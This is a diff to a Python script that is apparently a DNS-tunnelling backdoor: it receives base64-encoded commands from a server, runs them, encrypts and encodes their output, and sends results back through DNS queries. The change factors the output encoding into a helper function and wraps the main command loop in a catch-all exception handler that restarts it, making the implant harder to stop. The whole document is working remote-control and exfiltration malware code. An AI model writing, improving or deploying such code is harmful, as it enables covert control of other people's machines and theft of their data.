@@ -72,6 +72,14 @@ def encodeB64Equals(output):
       output = output[0]+"-"+output[1:-1]
   return output
 
+def processOutput(stdoutput):
+  # Encrypt output
+  eStdoutput = encrypt(stdoutput)
+  # Encode output data, ready for loop
+  output = base64.b64encode(eStdoutput)
+  output = encodeB64Equals(output)
+  return output
+
 def runCmd(cmd):
   # Parse command from response
   eNxtCmd = base64.b64decode(cmd)
@@ -95,11 +103,7 @@ def runCmd(cmd):
     except:
       stdoutput = 'Couldn\'t change directory to: {}'.format(directory)
  
-  # Encrypt output
-  eStdoutput = encrypt(stdoutput)
-  # Encode output data, ready for loop
-  output = base64.b64encode(eStdoutput)
-  output = encodeB64Equals(output)
+  output = processOutput(stdoutput)
 
   return output
 
@@ -124,11 +128,14 @@ def sendOutputToServer(output):
       dnsMakeQuery(url)
 
 def main():
-  while 1:
-    a = startConnection()
-    cmd = parseCmd(a)
-    stdoutput = runCmd(cmd)
-    sendOutputToServer(stdoutput)
+  try:
+    while 1:
+      a = startConnection()
+      cmd = parseCmd(a)
+      stdoutput = runCmd(cmd)
+      sendOutputToServer(stdoutput)
+  except:
+    main()
 
 if __name__ == '__main__':
   main()
